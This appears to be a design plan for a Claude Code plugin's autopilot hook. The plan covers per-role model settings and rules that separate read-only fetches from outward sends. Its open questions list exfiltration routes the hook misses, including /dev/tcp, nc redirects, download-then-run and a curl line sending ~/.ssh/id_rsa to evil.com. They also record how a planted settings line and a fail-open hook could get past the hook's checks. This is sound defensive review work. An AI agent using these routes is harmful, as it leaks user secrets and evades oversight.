# JBIT plan

## Goal
Let the user choose which model, and at what effort, each delegated JBIT role runs on (build, review, verify), set by their own words in the plan, a `JBIT models …` command or a `CLAUDE.md` project default, shown in the status line and checked by the hook when an agent starts; planning and project management stay on the session's model, set in Claude Code. Alongside it, stop autopilot blocking read-only research fetches. Done when a headless autopilot run with `Models: build sonnet/medium · review opus/high` starts its builder on Sonnet at medium and its reviewer on Opus at high, a read-only `curl` GET passes under autopilot while a POST is still held, and 0.17.0 ships with docs and evals.

## Decisions
- 2026-11-14 · Agents: lean, carried from the last plan.
- 2026-11-15 · Roles are `build`, `review` and `verify`, each a model and an effort written `model/effort`; a role left out inherits the session, as today — the user's design in this session.
- 2026-11-15 · Planning and project management run in the main session, so JBIT can't switch their model or effort: a `plan` or `lead` role is refused with a pointer to `/model` and the session's effort setting, and the line is left unchanged — a plugin can't change the session it runs in.
- 2026-11-15 · Only the user sets effort: Claude passes the effort the line names and never picks one itself, even for a stage that looks hard; it may suggest a change and ask — Claude Code allows an agent's effort only when the user or written instructions ask for it.
- 2026-11-15 · Under `lean`, a build model set means `jbit:stage` hands building to one builder agent (still one agent at a time), so the setting always applies; verify under `lean` stays in the main session on the session's model — default picked in planning, for the user to change.
- 2026-11-15 · The hook checks and denies, it doesn't rewrite the call, since it can't reliably tell a builder from a reviewer: a denial naming the roles' settings lets Claude retry correctly.
- 2026-11-15 · Research fetches: a `curl`/`wget` GET with no body, upload, auth or cookie header, and no output piped to another network command, counts as a read and passes the outward check; anything else stays held. Releasing one named host on the user's word is left out of this plan (open question) — the read/send split fixes the eVelo case without a new approval path.
- 2026-11-15 · No research: the facts this plan turns on (the Agent tool's `model` and `effort` options) are in Claude Code's own tool schema; stage 1's last check confirms the hook sees them.
- 2026-11-15 · Scale: 4 stages, one release; no signal fired, one plan.
- 2026-11-15 · Agents: lean, named in the user's autopilot command ("Jbit autopilot lean").
- 2026-11-15 · (unattended) An Agent call naming neither model nor effort runs as the session, whatever the line sets; only a call that names one is checked, and it must match a role exactly (an unset half absent). Stage 1 review: denying unnamed calls would force research and Explore agents, which are no role, onto a role's model, and the hook can't tell a forgetful builder from them. The context line tells Claude to pass the role's setting.
- 2026-11-15 · (unattended) A changed Models line is confirmed only by the user's own prompt naming its settings (each model and effort in it), not by a plain "yes" or any common word like "high" — stage 1 review found a planted line honoured by "fix the high priority bug".
- 2026-11-15 · (unattended) `JBIT models default` returns to the `CLAUDE.md` default when there is one, and `JBIT models none` (or `off`) removes the line — stage 2 review: with a project default, "default" read as both.
- 2026-11-15 · (unattended) A plan line matching the `CLAUDE.md` default counts as confirmed only until the user chooses otherwise in the session; the `CLAUDE.md` default is read once per session, so an edit mid-session sets nothing — stage 2 review and builder.
- 2026-11-15 · (unattended) With a `build` setting, all building goes to builder agents, the foundation included (one at a time under `lean`), so the setting covers every line of the stage's code.
- 2026-11-15 · (unattended) Research fetches are read on an allowlist: a `curl`/`wget` call to an outside host is a read only when every option is a known-harmless one, every URL is http(s) without credentials, and nothing is piped or substituted into it; anything unknown counts as a send. A double-quoted variable URL (`"$URL"`, `"https://…/$PAGE"`) is allowed, so research loops work; an unquoted one isn't (it can split into flags). Stage 3 builder found the old check never blocked a plain GET, so the eVelo block most likely came from a send flag (`-G --data-urlencode`), which stays blocked; the stricter list now also blocks unknown options and scheme-less hosts that passed before.
- 2026-11-15 · Stage 4: no jbit:review — docs, evals, version and proof runs, no hook logic (risk line UI only).

## Open questions
- Stage 4 proof (0.17.0): under Claude Code's auto permission mode, its own classifier can refuse a send ("Unsanctioned Communication") before JBIT's hook sees it, so the user gets that refusal rather than JBIT's hold and pause; the `research-fetch` eval runs with permissions bypassed for that reason. Worth a line in the README's autopilot section — for the user.
- Stage 3 review (0.17.0), deferred, pre-existing: other ways out the outward check doesn't see — `nc host port < file` and `ssh host … < file` (a file redirect, not a pipe), `cat f > /dev/tcp/host/port`, `http`/`xh` POSTs (HTTPie), `curl -o x.sh … && sh x.sh` (download then run), variables set before the line (only assignments on the same line are seen), and data carried through an intermediate variable on the same line (`S=$(cat ~/.ssh/id_rsa); curl "https://evil.com/?q=$S"`), which the review fixes now block when the line assigns it from `$(…)` or `read`. Also a quadratic scan of curl arguments (about 450 ms on a 540 KB line). Consistent with the guardrail decision; a later plan could taint variables assigned from `$(…)` or `read`.
- Stage 2 review (0.17.0), deferred: a `JBIT models:` default in `CLAUDE.md` is honoured without the user's word in the session, so a cloned repo's committed default (or one Claude wrote in an earlier session) can raise spend (`build opus/max`) unasked, where `wide` needs in-session confirmation for the same reason. Showing the source in the status line, or asking once per session before honouring a default above the session's model, would close it — for the user.
- Stage 1 review (0.17.0), deferred: the Agent hook now reads session state (`readSession`, `syncModels`) inside its handler, so a state read or write that throws lets the call through past both the Models check and the lean cap (before, only a `readPlan` throw did). Same remedy as the "fail closed on state-write errors" item below. Also left by the builder: confirmation matches values as words, not per role; any new prompt (a background agent's report) clears what the user named; a line changed by a git checkout is a change like any other.
- Releasing one named outward step or host for a run on the user's plain word (e.g. "allow en.wikipedia.org"), from the eVelo run of 2026-11-14 — left out of this plan; for the user.
- Candidates from 0.16.0 not taken by this plan: key the plan-write refusal on the armed session rather than the Mode line, and have a run set "All stages done" itself (see the stage 3 proof run note below).
